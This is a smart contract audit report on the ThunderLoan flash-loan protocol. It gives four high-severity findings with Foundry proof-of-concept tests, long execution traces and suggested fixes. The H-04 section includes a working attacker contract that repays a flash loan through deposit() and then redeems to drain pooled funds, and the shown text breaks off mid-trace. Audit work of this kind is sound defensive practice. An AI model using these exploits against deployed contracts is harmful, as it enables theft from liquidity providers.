# Thunder_Loan_Audit_Report

## H-01.Storage Collision during upgrade

### Summary

The storage layout of ` ThunderLoanUpgraded.sol ` is not compatible with the layout of the ` ThunderLoan.sol `,which will cause storage collision and mismatch of variable to different data.



### Vulnerability Details

Comparsion of Storage Layout in ` ThunderLoan.sol ` and ` ThunderLoanUpgraded.sol ` :

| Slot |         ThunderLoan.sol          |     ThunderLoanUpgraded.sol      |
| :--: | :------------------------------: | :------------------------------: |
|  0   |   mapping(s_tokenToAssetToken)   |   mapping(s_tokenToAssetToken)   |
|  1   |     uint256(s_feePrecision)      |     uint256(s_flashLoanFee)      |
|  2   |     uint256(s_flashLoanFee)      | mapping(s_currentlyFlashLoaning) |
|  3   | mapping(s_currentlyFlashLoaning) |                                  |

In Solidity,` constant ` variables are not stored in the contract's storage,memory,or stack at runtime.Instead,their values are embedded directly into the bytecode at compile time.

In ` ThunderLoanUpgraded.sol `,the storage of ` s_feePrecision ` is missing.Moreover,at position where ` s_feePrecision ` was previously located,` s_flashLoanFee ` is now present in the upgraded version.

When the proxy contract uses ` delegatecall ` low level function,it will execute logic from one of these implementation contracts and update the storage layout of the proxy contract itself.This means that when ` s_flashLoanFee ` is updated,the proxy's storage slot at that specific location will be updated.

Therefore,when the proxy contract attempts to read ` s_flashLoanFee ` variable as it did before the upgraded,it actually retrives the value of ` s_currentlyFlashLoaning ` instead.This discrepancy will lead to incorrect fee calculations in the end.



### Proof of Concept

#### Test Case

```solidity
function testStorageCollision() public {
    // 1000000000000000000
    uint256 initFeePrecision = thunderLoan.getFeePrecision();
    // 3000000000000000
    uint256 initFlashloanFee = thunderLoan.getFee();
    // upgrade the implementation
    address thunderLoanUpgraded = address(new ThunderLoanUpgraded());
    thunderLoan.upgradeTo(thunderLoanUpgraded);
    // 1000000000000000000
    uint256 updatedFlashloanFee = thunderLoan.getFee();
    // 3000000000000000 != 1000000000000000000
    assert(initFlashloanFee != updatedFlashloanFee);
    // 1000000000000000000
    assertEq(updatedFlashloanFee, initFeePrecision);
}
```

#### Output

```bash
[PASS] testStorageCollision() (gas: 5623762)
Traces:
  [5623762] ThunderLoanTest::testStorageCollision()
    ├─ [7514] ERC1967Proxy::fallback() [staticcall]
    │   ├─ [2500] ThunderLoan::getFeePrecision() [delegatecall]
    │   │   └─ ← [Return] 1000000000000000000 [1e18]
    │   └─ ← [Return] 1000000000000000000 [1e18]
    ├─ [3034] ERC1967Proxy::fallback() [staticcall]
    │   ├─ [2520] ThunderLoan::getFee() [delegatecall]
    │   │   └─ ← [Return] 3000000000000000 [3e15]
    │   └─ ← [Return] 3000000000000000 [3e15]
    ├─ [5552560] → new ThunderLoanUpgraded@0xa0Cb889707d426A7A386870A03bc70d1b0697598
    │   ├─ emit Initialized(version: 255)
    │   └─ ← [Return] 27610 bytes of code
    ├─ [11627] ERC1967Proxy::fallback(ThunderLoanUpgraded: [0xa0Cb889707d426A7A386870A03bc70d1b0697598])
    │   ├─ [11113] ThunderLoan::upgradeTo(ThunderLoanUpgraded: [0xa0Cb889707d426A7A386870A03bc70d1b0697598]) [delegatecall]
    │   │   ├─ [482] ThunderLoanUpgraded::proxiableUUID() [staticcall]
    │   │   │   └─ ← [Return] 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc
    │   │   ├─ emit Upgraded(implementation: ThunderLoanUpgraded: [0xa0Cb889707d426A7A386870A03bc70d1b0697598])
    │   │   └─ ← [Stop] 
    │   └─ ← [Return] 
    ├─ [1012] ERC1967Proxy::fallback() [staticcall]
    │   ├─ [498] ThunderLoanUpgraded::getFee() [delegatecall]
    │   │   └─ ← [Return] 1000000000000000000 [1e18]
    │   └─ ← [Return] 1000000000000000000 [1e18]
    └─ ← [Stop] 

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 5.88ms (621.17µs CPU time)
```



### Impact

This vulnerability can cause incorrect access or modification of critical variables.



### Recommendation

In ` ThunderLoanUpgraded.sol `,use the same storage layout as the ` ThunderLoan.sol `.

```solidity
// ThunderLoanUpgraded.sol
mapping(IERC20 => AssetToken) public s_tokenToAssetToken;

// uint256 private s_flashLoanFee; // 0.3% ETH fee
// uint256 public constant FEE_PRECISION = 1e18;
uint256 private s_feePrecision;
uint256 private s_flashLoanFee;

mapping(IERC20 token => bool currentlyFlashLoaning) private s_currentlyFlashLoaning;
```



## H-02.The location where the fee is calculated may lead to loss of funds

### Summary

The fee is calculated in the ` deposit ` function,and the fee keeps increasing.This allows attackers to immediately ` redeem ` tokens and easily obtain more tokens.



### Vulnerability Details

In ` ThunderLoan.sol `,the ` deposit ` function immediately calculates the fee after the user deposits.

This will allow anyone who deposits to immediately redeem and get more tokens than they deposited.Underlying of any assert token can be completely drained in this manner.

```solidity
// ThunderLoan.sol
function deposit(IERC20 token, uint256 amount) external revertIfZero(amount) revertIfNotAllowedToken(token) {
    ...
    uint256 calculatedFee = getCalculatedFee(token, amount);
    assetToken.updateExchangeRate(calculatedFee);
    ...
}
```



### Proof of Concept

#### Test Case

```solidity
function testUpdateFeeOnDeposit() public setAllowedToken {
    AssetToken assetToken = thunderLoan.getAssetFromToken(tokenA);
    console.log("Init fee:", vm.toString(assetToken.getExchangeRate()));
    tokenA.mint(liquidityProvider, AMOUNT);
    tokenA.mint(user, AMOUNT);

    vm.startPrank(liquidityProvider);
    tokenA.approve(address(thunderLoan), AMOUNT);
    thunderLoan.deposit(tokenA, AMOUNT);
    vm.stopPrank();

    vm.startPrank(user);
    tokenA.approve(address(thunderLoan), AMOUNT);
    thunderLoan.deposit(tokenA, AMOUNT);
    vm.stopPrank();

    console.log("After fee:", vm.toString(assetToken.getExchangeRate()));

    vm.startPrank(liquidityProvider);
    thunderLoan.redeem(tokenA, assetToken.balanceOf(liquidityProvider));
    vm.stopPrank();

    // assertGt(tokenA.balanceOf(liquidityProvider), AMOUNT);
    console.log("Before Amount:", vm.toString(AMOUNT));
    console.log("After Amount:", vm.toString(tokenA.balanceOf(liquidityProvider)));
}
```

#### Output

```bash
[PASS] testUpdateFeeOnDeposit() (gas: 2154424)
Logs:
  Init fee: 1000000000000000000
  After fee: 1004506753369945082
  Before Amount: 10000000000000000000
  After Amount: 10045067533699450820

Traces:
  [2253924] ThunderLoanTest::testUpdateFeeOnDeposit()
    ├─ [7662] ERC1967Proxy::fallback() [staticcall]
    │   ├─ [2648] ThunderLoan::owner() [delegatecall]
    │   │   └─ ← [Return] ThunderLoanTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]
    │   └─ ← [Return] ThunderLoanTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]
    ├─ [0] VM::prank(ThunderLoanTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
    │   └─ ← [Return] 
    ├─ [1884002] ERC1967Proxy::fallback(ERC20Mock: [0x5991A2dF15A8F6A256D3Ec51E99254Cd3fb576A9], true)
    │   ├─ [1883482] ThunderLoan::setAllowedToken(ERC20Mock: [0x5991A2dF15A8F6A256D3Ec51E99254Cd3fb576A9], true) [delegatecall]
    │   │   ├─ [3421] ERC20Mock::name() [staticcall]
    │   │   │   └─ ← [Return] "ERC20Mock"
    │   │   ├─ [3487] ERC20Mock::symbol() [staticcall]
    │   │   │   └─ ← [Return] "E20M"
    │   │   ├─ [1808403] → new AssetToken@0xa38D17ef017A314cCD72b8F199C0e108EF7Ca04c
    │   │   │   └─ ← [Return] 8683 bytes of code
    │   │   ├─ emit AllowedTokenSet(token: ERC20Mock: [0x5991A2dF15A8F6A256D3Ec51E99254Cd3fb576A9], asset: AssetToken: [0xa38D17ef017A314cCD72b8F199C0e108EF7Ca04c], allowed: true)
    │   │   └─ ← [Return] AssetToken: [0xa38D17ef017A314cCD72b8F199C0e108EF7Ca04c]
    │   └─ ← [Return] AssetToken: [0xa38D17ef017A314cCD72b8F199C0e108EF7Ca04c]
    ├─ [1712] ERC1967Proxy::fallback(ERC20Mock: [0x5991A2dF15A8F6A256D3Ec51E99254Cd3fb576A9]) [staticcall]
    │   ├─ [1195] ThunderLoan::getAssetFromToken(ERC20Mock: [0x5991A2dF15A8F6A256D3Ec51E99254Cd3fb576A9]) [delegatecall]
    │   │   └─ ← [Return] AssetToken: [0xa38D17ef017A314cCD72b8F199C0e108EF7Ca04c]
    │   └─ ← [Return] AssetToken: [0xa38D17ef017A314cCD72b8F199C0e108EF7Ca04c]
    ├─ [542] AssetToken::getExchangeRate() [staticcall]
    │   └─ ← [Return] 1000000000000000000 [1e18]
    ├─ [0] VM::toString(1000000000000000000 [1e18]) [staticcall]
    │   └─ ← [Return] "1000000000000000000"
    ├─ [0] console::log("Init fee:", "1000000000000000000") [staticcall]
    │   └─ ← [Stop] 
    ├─ [47273] ERC20Mock::mint(0x000000000000000000000000000000000000007B, 10000000000000000000 [1e19])
    │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: 0x000000000000000000000000000000000000007B, value: 10000000000000000000 [1e19])
    │   └─ ← [Stop] 
    ├─ [25373] ERC20Mock::mint(0x00000000000000000000000000000000000001c8, 10000000000000000000 [1e19])
    │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: 0x00000000000000000000000000000000000001c8, value: 10000000000000000000 [1e19])
    │   └─ ← [Stop] 
    ├─ [0] VM::startPrank(0x000000000000000000000000000000000000007B)
    │   └─ ← [Return] 
    ├─ [25234] ERC20Mock::approve(ERC1967Proxy: [0xc7183455a4C133Ae270771860664b6B7ec320bB1], 10000000000000000000 [1e19])
    │   ├─ emit Approval(owner: 0x000000000000000000000000000000000000007B, spender: ERC1967Proxy: [0xc7183455a4C133Ae270771860664b6B7ec320bB1], value: 10000000000000000000 [1e19])
    │   └─ ← [Return] true
    ├─ [105453] ERC1967Proxy::fallback(ERC20Mock: [0x5991A2dF15A8F6A256D3Ec51E99254Cd3fb576A9], 10000000000000000000 [1e19])
    │   ├─ [104936] ThunderLoan::deposit(ERC20Mock: [0x5991A2dF15A8F6A256D3Ec51E99254Cd3fb576A9], 10000000000000000000 [1e19]) [delegatecall]
    │   │   ├─ [542] AssetToken::getExchangeRate() [staticcall]
    │   │   │   └─ ← [Return] 1000000000000000000 [1e18]
    │   │   ├─ [392] AssetToken::EXCHANGE_RATE_PRECISION() [staticcall]
    │   │   │   └─ ← [Return] 1000000000000000000 [1e18]
    │   │   ├─ emit Deposit(account: 0x000000000000000000000000000000000000007B, token: ERC20Mock: [0x5991A2dF15A8F6A256D3Ec51E99254Cd3fb576A9], amount: 10000000000000000000 [1e19])
    │   │   ├─ [47373] AssetToken::mint(0x000000000000000000000000000000000000007B, 10000000000000000000 [1e19])
    │   │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: 0x000000000000000000000000000000000000007B, value: 10000000000000000000 [1e19])
    │   │   │   └─ ← [Stop] 
    │   │   ├─ [2912] MockPoolFactory::getPool(ERC20Mock: [0x5991A2dF15A8F6A256D3Ec51E99254Cd3fb576A9]) [staticcall]
    │   │   │   └─ ← [Return] MockTSwapPool: [0xffD4505B3452Dc22f8473616d50503bA9E1710Ac]
    │   │   ├─ [310] MockTSwapPool::getPriceOfOnePoolTokenInWeth() [staticcall]
    │   │   │   └─ ← [Return] 1000000000000000000 [1e18]
    │   │   ├─ [3017] AssetToken::updateExchangeRate(30000000000000000 [3e16])
    │   │   │   ├─ emit ExchangeRateUpdated(newExchangeRate: 1003000000000000000 [1.003e18])
    │   │   │   └─ ← [Stop] 
    │   │   ├─ [28711] ERC20Mock::transferFrom(0x000000000000000000000000000000000000007B, AssetToken: [0xa38D17ef017A314cCD72b8F199C0e108EF7Ca04c], 10000000000000000000 [1e19])
    │   │   │   ├─ emit Approval(owner: 0x000000000000000000000000000000000000007B, spender: ERC1967Proxy: [0xc7183455a4C133Ae270771860664b6B7ec320bB1], value: 0)
    │   │   │   ├─ emit Transfer(from: 0x000000000000000000000000000000000000007B, to: AssetToken: [0xa38D17ef017A314cCD72b8F199C0e108EF7Ca04c], value: 10000000000000000000 [1e19])
    │   │   │   └─ ← [Return] true
    │   │   └─ ← [Stop] 
    │   └─ ← [Return] 
    ├─ [0] VM::stopPrank()
    │   └─ ← [Return] 
    ├─ [0] VM::startPrank(0x00000000000000000000000000000000000001c8)
    │   └─ ← [Return] 
    ├─ [25234] ERC20Mock::approve(ERC1967Proxy: [0xc7183455a4C133Ae270771860664b6B7ec320bB1], 10000000000000000000 [1e19])
    │   ├─ emit Approval(owner: 0x00000000000000000000000000000000000001c8, spender: ERC1967Proxy: [0xc7183455a4C133Ae270771860664b6B7ec320bB1], value: 10000000000000000000 [1e19])
    │   └─ ← [Return] true
    ├─ [48653] ERC1967Proxy::fallback(ERC20Mock: [0x5991A2dF15A8F6A256D3Ec51E99254Cd3fb576A9], 10000000000000000000 [1e19])
    │   ├─ [48136] ThunderLoan::deposit(ERC20Mock: [0x5991A2dF15A8F6A256D3Ec51E99254Cd3fb576A9], 10000000000000000000 [1e19]) [delegatecall]
    │   │   ├─ [542] AssetToken::getExchangeRate() [staticcall]
    │   │   │   └─ ← [Return] 1003000000000000000 [1.003e18]
    │   │   ├─ [392] AssetToken::EXCHANGE_RATE_PRECISION() [staticcall]
    │   │   │   └─ ← [Return] 1000000000000000000 [1e18]
    │   │   ├─ emit Deposit(account: 0x00000000000000000000000000000000000001c8, token: ERC20Mock: [0x5991A2dF15A8F6A256D3Ec51E99254Cd3fb576A9], amount: 10000000000000000000 [1e19])
    │   │   ├─ [25473] AssetToken::mint(0x00000000000000000000000000000000000001c8, 9970089730807577268 [9.97e18])
    │   │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: 0x00000000000000000000000000000000000001c8, value: 9970089730807577268 [9.97e18])
    │   │   │   └─ ← [Stop] 
    │   │   ├─ [912] MockPoolFactory::getPool(ERC20Mock: [0x5991A2dF15A8F6A256D3Ec51E99254Cd3fb576A9]) [staticcall]
    │   │   │   └─ ← [Return] MockTSwapPool: [0xffD4505B3452Dc22f8473616d50503bA9E1710Ac]
    │   │   ├─ [310] MockTSwapPool::getPriceOfOnePoolTokenInWeth() [staticcall]
    │   │   │   └─ ← [Return] 1000000000000000000 [1e18]
    │   │   ├─ [3017] AssetToken::updateExchangeRate(30000000000000000 [3e16])
    │   │   │   ├─ emit ExchangeRateUpdated(newExchangeRate: 1004506753369945082 [1.004e18])
    │   │   │   └─ ← [Stop] 
    │   │   ├─ [6811] ERC20Mock::transferFrom(0x00000000000000000000000000000000000001c8, AssetToken: [0xa38D17ef017A314cCD72b8F199C0e108EF7Ca04c], 10000000000000000000 [1e19])
    │   │   │   ├─ emit Approval(owner: 0x00000000000000000000000000000000000001c8, spender: ERC1967Proxy: [0xc7183455a4C133Ae270771860664b6B7ec320bB1], value: 0)
    │   │   │   ├─ emit Transfer(from: 0x00000000000000000000000000000000000001c8, to: AssetToken: [0xa38D17ef017A314cCD72b8F199C0e108EF7Ca04c], value: 10000000000000000000 [1e19])
    │   │   │   └─ ← [Return] true
    │   │   └─ ← [Stop] 
    │   └─ ← [Return] 
    ├─ [0] VM::stopPrank()
    │   └─ ← [Return] 
    ├─ [542] AssetToken::getExchangeRate() [staticcall]
    │   └─ ← [Return] 1004506753369945082 [1.004e18]
    ├─ [0] VM::toString(1004506753369945082 [1.004e18]) [staticcall]
    │   └─ ← [Return] "1004506753369945082"
    ├─ [0] console::log("After fee:", "1004506753369945082") [staticcall]
    │   └─ ← [Stop] 
    ├─ [0] VM::startPrank(0x000000000000000000000000000000000000007B)
    │   └─ ← [Return] 
    ├─ [852] AssetToken::balanceOf(0x000000000000000000000000000000000000007B) [staticcall]
    │   └─ ← [Return] 10000000000000000000 [1e19]
    ├─ [37719] ERC1967Proxy::fallback(ERC20Mock: [0x5991A2dF15A8F6A256D3Ec51E99254Cd3fb576A9], 10000000000000000000 [1e19])
    │   ├─ [37202] ThunderLoan::redeem(ERC20Mock: [0x5991A2dF15A8F6A256D3Ec51E99254Cd3fb576A9], 10000000000000000000 [1e19]) [delegatecall]
    │   │   ├─ [542] AssetToken::getExchangeRate() [staticcall]
    │   │   │   └─ ← [Return] 1004506753369945082 [1.004e18]
    │   │   ├─ [392] AssetToken::EXCHANGE_RATE_PRECISION() [staticcall]
    │   │   │   └─ ← [Return] 1000000000000000000 [1e18]
    │   │   ├─ emit Redeemed(account: 0x000000000000000000000000000000000000007B, token: ERC20Mock: [0x5991A2dF15A8F6A256D3Ec51E99254Cd3fb576A9], amountOfAssetToken: 10000000000000000000 [1e19], amountOfUnderlying: 10045067533699450820 [1.004e19])
    │   │   ├─ [3508] AssetToken::burn(0x000000000000000000000000000000000000007B, 10000000000000000000 [1e19])
    │   │   │   ├─ emit Transfer(from: 0x000000000000000000000000000000000000007B, to: 0x0000000000000000000000000000000000000000, value: 10000000000000000000 [1e19])
    │   │   │   └─ ← [Stop] 
    │   │   ├─ [26483] AssetToken::transferUnderlyingTo(0x000000000000000000000000000000000000007B, 10045067533699450820 [1.004e19])
    │   │   │   ├─ [23719] ERC20Mock::transfer(0x000000000000000000000000000000000000007B, 10045067533699450820 [1.004e19])
    │   │   │   │   ├─ emit Transfer(from: AssetToken: [0xa38D17ef017A314cCD72b8F199C0e108EF7Ca04c], to: 0x000000000000000000000000000000000000007B, value: 10045067533699450820 [1.004e19])
    │   │   │   │   └─ ← [Return] true
    │   │   │   └─ ← [Stop] 
    │   │   └─ ← [Stop] 
    │   └─ ← [Return] 
    ├─ [0] VM::stopPrank()
    │   └─ ← [Return] 
    ├─ [0] VM::toString(10000000000000000000 [1e19]) [staticcall]
    │   └─ ← [Return] "10000000000000000000"
    ├─ [0] console::log("Before Amount:", "10000000000000000000") [staticcall]
    │   └─ ← [Stop] 
    ├─ [874] ERC20Mock::balanceOf(0x000000000000000000000000000000000000007B) [staticcall]
    │   └─ ← [Return] 10045067533699450820 [1.004e19]
    ├─ [0] VM::toString(10045067533699450820 [1.004e19]) [staticcall]
    │   └─ ← [Return] "10045067533699450820"
    ├─ [0] console::log("After Amount:", "10045067533699450820") [staticcall]
    │   └─ ← [Stop] 
    └─ ← [Stop] 

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 1.85ms (545.92µs CPU time)
```



### Impact

This vulnerability can drain all tokens,causing loss of funds.



### Recommendation

Do not update the fee when depositing,only update the fee after a flash loan is successfully.

```solidity
function deposit(IERC20 token, uint256 amount) external revertIfZero(amount) revertIfNotAllowedToken(token) {
    AssetToken assetToken = s_tokenToAssetToken[token];
    uint256 exchangeRate = assetToken.getExchangeRate();
    uint256 mintAmount = (amount * assetToken.EXCHANGE_RATE_PRECISION()) / exchangeRate;
    emit Deposit(msg.sender, token, amount);
    assetToken.mint(msg.sender, mintAmount);
    // uint256 calculatedFee = getCalculatedFee(token, amount);
    // assetToken.updateExchangeRate(calculatedFee);
    token.safeTransferFrom(msg.sender, address(assetToken), amount);
}
```



## H-03.Fee's Calculation may be incorrect due to non-standard ERC20 tokens

### Summary

Some ERC20 tokens have a decimal value that is not the default 18;for example,USDT has a decimal value of 6.

This can lead to significant discrepancies in the calculation of fees.



### Vulnerability Details

The ` getCalculationFee() ` function in both the ` ThunderLoan.sol ` file and ` ThunderLoanUpgraded.sol ` file has this vulnerability.

```solidity
function getCalculatedFee(IERC20 token, uint256 amount) public view returns (uint256 fee) {
    //slither-disable-next-line divide-before-multiply
    uint256 valueOfBorrowedToken = (amount * getPriceInWeth(address(token))) / s_feePrecision;
    //slither-disable-next-line divide-before-multiply
    fee = (valueOfBorrowedToken * s_flashLoanFee) / s_feePrecision;
}
```

For example,assume that there are two users,UserA and UserB,both borrowing tokens worth 1 ETH through this flash loan.

However,UserA borrows 1 ETH token,while UserB borrows 5000 USDT(assuming the current exchange rate is 1 ETH = 5000 USDT):

> 1 ETH = 5000 USDT;
>
> 1 ETH = 1e18 Wei;
>
> 1 USDT = 1e6;
>
> 1 USDT = 1e18 / 5000 Wei;

UserA：

* amount = 1e18
* getPriceInWeth(address(ETH)) = 1e18 Wei
* valueOfBorrowedToken = (1e18 * 1e18) / 1e18 = 1e18
* fee = (1e18 * 3e15) / 1e18 = 3e15 = 0.003 ETH

UserB:

* amount = 5000 USDT = 5000 * 1e6
* getPriceInWeth(address(USDT)) = 1e18 / 5000 Wei
* valueOfBorrowedToken = (5000 * 1e6 * (1e18 / 5000)) / 1e18 = 1e6
* fee = (1e6 * 3e15) / 1e18 = 3e3 = 0.000000000000003 ETH

It is evident that the final calculated fees are different. For loans of equal value, the one with a smaller decimal value has an advantage.



### Impact

This vulnerability can lead to the loss of flash loan's fee.



### Recommendation

Use the token's decimal to calculate the value of the borrowed token.

```solidity
function getCalculatedFee(IERC20 token, uint256 amount) public view returns (uint256 fee) {
    // uint256 valueOfBorrowedToken = (amount * getPriceInWeth(address(token))) / s_feePrecision;
    // fee = (valueOfBorrowedToken * s_flashLoanFee) / s_feePrecision;
    tokenDecimal = getTokenDecimals(token);
    uint256 valueOfBorrowedToken = (amount * getPriceInWeth(address(token))) / tokenDecimal;
    fee = (valueOfBorrowedToken * s_flashLoanFee) / getTokenDecimals(ETH);
}

function getTokenDecimals(IERC20 token) public view returns (uint256) {
    return token.decimals();
}
```



## H-04.All funds can be stolen if the flash loan is returned using deposit()

### Summary

Since there are no restrictions on the operations executed in a flash loan, the only check is whether the amount after borrowing is greater than the amount before borrowing.

Therefore, an attacker can use ` deposit() ` instead of ` repay() ` after borrowing to settle the loan.

Because the funds in the AssetToken contract are always increasing, the attacker can then use ` redeem() ` to withdraw all the funds.



### Vulnerability Details

The ` flashloan() ` function in both the ` ThunderLoan.sol ` file and ` ThunderLoanUpgraded.sol ` file has this vulnerability.

```solidity
function flashloan(address receiverAddress, IERC20 token, uint256 amount, bytes calldata params) external {
    ...
    uint256 startingBalance = IERC20(token).balanceOf(address(assetToken));
    ...
    receiverAddress.functionCall(
        abi.encodeWithSignature(
            "executeOperation(address,uint256,uint256,address,bytes)",
            address(token),
            amount,
            fee,
            msg.sender,
            params
        )
    );
    uint256 endingBalance = token.balanceOf(address(assetToken));
    if (endingBalance < startingBalance + fee) {
        revert ThunderLoan__NotPaidBack(startingBalance + fee, endingBalance);
    }
    ...
}
```

The problem arises precisely from this simple check that the ending balance must be greater than the starting balance.

So the attacker first calls ` flashloan() ` to borrow tokens, and then executes ` deposit() ` with the borrowed tokens in the ` executeOperation() ` function. At this point, the ` endingBalance ` will be greater than the ` startingBalance `. Finally, the attacker can use ` redeem() ` to withdraw all the funds.



### Proof of Concept

#### Test Case

Attacker's Contract:

```solidity
contract Exp {
    address owner;
    ThunderLoan thunderLoan;
    uint256 balanceBeforeFlashLoan;
    uint256 balanceAfterFlashLoan;

    constructor(address addr){
        owner = msg.sender;
        thunderLoan = ThunderLoan(addr);
        balanceBeforeFlashLoan = 0;
    }

    function executeOperation(
        IERC20 token,
        uint256 amount,
        uint256 fee,
        address initiator,
        bytes calldata
    ) external returns (bool){
        balanceBeforeFlashLoan = token.balanceOf(address(this));
        token.approve(address(thunderLoan), amount + fee);
        thunderLoan.deposit(token, amount + fee);
        balanceAfterFlashLoan = token.balanceOf(address(this));
    }

    function getBalanceBeforeFlashLoan() external view returns (uint256) {
        return balanceBeforeFlashLoan;
    }
    function getBalanceAfterFlashLoan() external view returns (uint256) {
        return balanceAfterFlashLoan;
    }
    function sendAssetToken(IERC20 token) public {
        token.transfer(msg.sender, token.balanceOf(address(this)));
    }
}
```

Test:

```solidity
function testWithdrawAllFunds() public setAllowedToken hasDeposits {
    uint256 amountToBorrow = AMOUNT * 10;
    vm.startPrank(user);
    Exp exp = new Exp(address(thunderLoan));
    tokenA.mint(address(exp), AMOUNT);
    thunderLoan.flashloan(address(exp), tokenA, amountToBorrow, "");
    exp.sendAssetToken(tokenA);
    thunderLoan.redeem(tokenA, type(uint256).max);
    vm.stopPrank();
    console.log("thunderLoan.Balance:", vm.toString(tokenA.balanceOf(address(thunderLoan.getAssetFromToken(tokenA)))));
}
```

#### Output

```bash
[PASS] testWithdrawAllFunds() (gas: 2763111)
Logs:
  thunderLoan.Balance: 1000300000000000000000

Traces:
  [2862611] ThunderLoanTest::testWithdrawAllFunds()
    ├─ [7662] ERC1967Proxy::fallback() [staticcall]
    │   ├─ [2648] ThunderLoan::owner() [delegatecall]
    │   │   └─ ← [Return] ThunderLoanTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]
    │   └─ ← [Return] ThunderLoanTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]
    ├─ [0] VM::prank(ThunderLoanTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
    │   └─ ← [Return] 
    ├─ [1884002] ERC1967Proxy::fallback(ERC20Mock: [0x5991A2dF15A8F6A256D3Ec51E99254Cd3fb576A9], true)
    │   ├─ [1883482] ThunderLoan::setAllowedToken(ERC20Mock: [0x5991A2dF15A8F6A256D3Ec51E99254Cd3fb576A9], true) [delegatecall]
    │   │   ├─ [3421] ERC20Mock::name() [staticcall]
    │   │   │   └─ ← [Return] "ERC20Mock"
    │   │   ├─ [3487] ERC20Mock::symbol() [staticcall]
    │   │   │   └─ ← [Return] "E20M"
    │   │   ├─ [1808403] → new AssetToken@0xa38D17ef017A314cCD72b8F199C0e108EF7Ca04c
    │   │   │   └─ ← [Return] 8683 bytes of code
    │   │   ├─ emit AllowedTokenSet(token: ERC20Mock: [0x5991A2dF15A8F6A256D3Ec51E99254Cd3fb576A9], asset: AssetToken: [0xa38D17ef017A314cCD72b8F199C0e108EF7Ca04c], allowed: true)
    │   │   └─ ← [Return] AssetToken: [0xa38D17ef017A314cCD72b8F199C0e108EF7Ca04c]
    │   └─ ← [Return] AssetToken: [0xa38D17ef017A314cCD72b8F199C0e108EF7Ca04c]
    ├─ [0] VM::startPrank(0x000000000000000000000000000000000000007B)
    │   └─ ← [Return] 
    ├─ [47273] ERC20Mock::mint(0x000000000000000000000000000000000000007B, 1000000000000000000000 [1e21])
    │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: 0x000000000000000000000000000000000000007B, value: 1000000000000000000000 [1e21])
    │   └─ ← [Stop] 
    ├─ [25234] ERC20Mock::approve(ERC1967Proxy: [0xc7183455a4C133Ae270771860664b6B7ec320bB1], 1000000000000000000000 [1e21])
    │   ├─ emit Approval(owner: 0x000000000000000000000000000000000000007B, spender: ERC1967Proxy: [0xc7183455a4C133Ae270771860664b6B7ec320bB1], value: 1000000000000000000000 [1e21])
    │   └─ ← [Return] true
    ├─ [105453] ERC1967Proxy::fallback(ERC20Mock: [0x5991A2dF15A8F6A256D3Ec51E99254Cd3fb576A9], 1000000000000000000000 [1e21])
    │   ├─ [104936] ThunderLoan::deposit(ERC20Mock: [0x5991A2dF15A8F6A256D3Ec51E99254Cd3fb576A9], 1000000000000000000000 [1e21]) [delegatecall]
    │   │   ├─ [542] AssetToken::getExchangeRate() [staticcall]
    │   │   │   └─ ← [Return] 1000000000000000000 [1e18]
    │   │   ├─ [392] AssetToken::EXCHANGE_RATE_PRECISION() [staticcall]
    │   │   │   └─ ← [Return] 1000000000000000000 [1e18]
    │   │   ├─ emit Deposit(account: 0x000000000000000000000000000000000000007B, token: ERC20Mock: [0x5991A2dF15A8F6A256D3Ec51E99254Cd3fb576A9], amount: 1000000000000000000000 [1e21])
    │   │   ├─ [47373] AssetToken::mint(0x000000000000000000000000000000000000007B, 1000000000000000000000 [1e21])
    │   │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: 0x000000000000000000000000000000000000007B, value: 1000000000000000000000 [1e21])
    │   │   │   └─ ← [Stop] 
    │   │   ├─ [2912] MockPoolFactory::getPool(ERC20Mock: [0x5991A2dF15A8F6A256D3Ec51E99254Cd3fb576A9]) [staticcall]
    │   │   │   └─ ← [Return] MockTSwapPool: [0xffD4505B3452Dc22f8473616d50503bA9E1710Ac]
    │   │   ├─ [310] MockTSwapPool::getPriceOfOnePoolTokenInWeth() [staticcall]
    │   │   │   └─ ← [Return] 1000000000000000000 [1e18]
    │   │   ├─ [3017] AssetToken::updateExchangeRate(3000000000000000000 [3e18])
    │   │   │   ├─ emit ExchangeRateUpdated(newExchangeRate: 1003000000000000000 [1.003e18])
    │   │   │   └─ ← [Stop] 
    │   │   ├─ [28711] ERC20Mock::transferFrom(0x000000000000000000000000000000000000007B, AssetToken: [0xa38D17ef017A314cCD72b8F199C0e108EF7Ca04c], 1000000000000000000000 [1e21])
    │   │   │   ├─ emit Approval(owner: 0x000000000000000000000000000000000000007B, spender: ERC1967Proxy: [0xc7183455a4C133Ae270771860664b6B7ec320bB1], value: 0)
    │   │   │   ├─ emit Transfer(from: 0x000000000000000000000000000000000000007B, to: AssetToken: [0xa38D17ef017A314cCD72b8F199C0e108EF7Ca04c], value: 1000000000000000000000 [1e21])
    │   │   │   └─ ← [Return] true
    │   │   └─ ← [Stop] 
    │   └─ ← [Return] 
    ├─ [0] VM::stopPrank()
    │   └─ ← [Return] 
    ├─ [0] VM::startPrank(0x00000000000000000000000000000000000001c8)
    │   └─ ← [Return] 
    ├─ [477961] → new Exp@0x5Ee7226D9ca1496074e4CAe0a8d939c0F1d9FeeD
    │   └─ ← [Return] 2153 bytes of code
    ├─ [25373] ERC20Mock::mint(Exp: [0x5Ee7226D9ca1496074e4CAe0a8d939c0F1d9FeeD], 10000000000000000000 [1e19])
    │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: Exp: [0x5Ee7226D9ca1496074e4CAe0a8d939c0F1d9FeeD], value: 10000000000000000000 [1e19])
    │   └─ ← [Stop] 
